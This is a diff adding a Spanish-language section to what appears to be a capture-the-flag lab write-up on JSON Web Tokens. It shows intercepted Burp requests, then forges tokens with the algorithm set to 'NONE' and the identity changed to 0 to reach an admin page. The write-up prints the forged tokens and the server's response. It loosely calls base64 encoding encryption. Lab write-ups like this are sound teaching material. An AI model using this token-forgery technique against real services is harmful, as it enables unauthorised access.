@@ -54,3 +54,130 @@ Utilizamos el endpoint de registro de usuario registrando " arthur", el cuál ya
 ### JSON Web Token
 -------------------------------
 
+Los JWT se dividen en 3 partes:
+1) Header:
+```
+{  "alg": "HS256", "typ": "JWT"}
+```
+* alg: Podría ser "HMAC", "RSA" o "SHA256".
+
+2) Payload:
+Contiene la data puede ser todo tipo según se requiera.
+3) Signature:
+Sirve para corroborar la integridad de los datos.
+
+
+Cuando se visita la página alojada en el puerto "5000"
+```
+http://10.10.149.137:5000/
+```
+Utilizas las credenciales user:user seleccionar Authenticate-> "/auth" al interceptar la petición con burpsuite:
+
+Request:
+```
+POST /auth HTTP/1.1
+Host: 10.10.149.137:5000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 37
+Origin: http://10.10.149.137:5000
+Connection: close
+Referer: http://10.10.149.137:5000/
+
+{"username":"user","password":"user"}
+```
+
+Response
+```
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 188
+Server: Werkzeug/0.16.0 Python/3.6.9
+Date: Thu, 26 Nov 2020 03:18:35 GMT
+
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDYzNjEwMTUsImlhdCI6MTYwNjM2MDcxNSwibmJmIjoxNjA2MzYwNzE1LCJpZGVudGl0eSI6MX0.LHBYwdUJ6EX8SMUj-ts5dBu0D3OR7fX_07ZTxdJl2aI"}
+```
+
+Posteriormente al seleccionar en el botón "Go" -> "/protected":
+```
+GET /protected HTTP/1.1
+Host: 10.10.149.137:5000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDYzNjEwMTUsImlhdCI6MTYwNjM2MDcxNSwibmJmIjoxNjA2MzYwNzE1LCJpZGVudGl0eSI6MX0.LHBYwdUJ6EX8SMUj-ts5dBu0D3OR7fX_07ZTxdJl2aI
+Connection: close
+Referer: http://10.10.149.137:5000/
+```
+Utilizaremos la siguiente página que realiza la decodificacion de jwt - HS256 "https://jwt.io/"
+
+```
+-----------     HEADER      -----------
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+---------------------------------------
+-----------     Payload      -----------
+{
+  "exp": 1606361015,
+  "iat": 1606360715,
+  "nbf": 1606360715,
+  "identity": 1
+}
+---------------------------------------
+------     VERIFY SIGNATURE      ------
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  
+your-256-bit-secret
+
+) secret base64 encoded
+---------------------------------------
+```
+1) Primera parte "HEADER".
+2) Segunda parte "Payload".
+```
+{"typ":"JWT","alg":"NONE"}
+{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":2}
+```
+1)Encriptando primera parte (base64).
+2)Encriptando segunda parte (base64).
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K
+eyJleHAiOjE1ODY2MjA5MjksImlhdCI6MTU4NjYyMDYyOSwibmJmIjoxNTg2NjIwNjI5LCJpZGVudGl0eSI6Mn0K
+```
+
+Utilizaremos el mismo método para acceder al admin cambiando el identity por 0:
+```
+{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":0}
+eyJleHAiOjE1ODY2MjA5MjksImlhdCI6MTU4NjYyMDYyOSwibmJmIjoxNTg2NjIwNjI5LCJpZGVudGl0eSI6MH0K
+```
+```
+GET /protected HTTP/1.1
+Host: 10.10.149.137:5000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY2MjA5MjksImlhdCI6MTU4NjYyMDYyOSwibmJmIjoxNTg2NjIwNjI5LCJpZGVudGl0eSI6MH0K.
+Connection: close
+Referer: http://10.10.149.137:5000/
+```
+La llave obtenida: 
+```
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 35
+Server: Werkzeug/0.16.0 Python/3.6.9
+Date: Thu, 26 Nov 2020 04:07:49 GMT
+
+Welcome admin: 9249****************28
+```
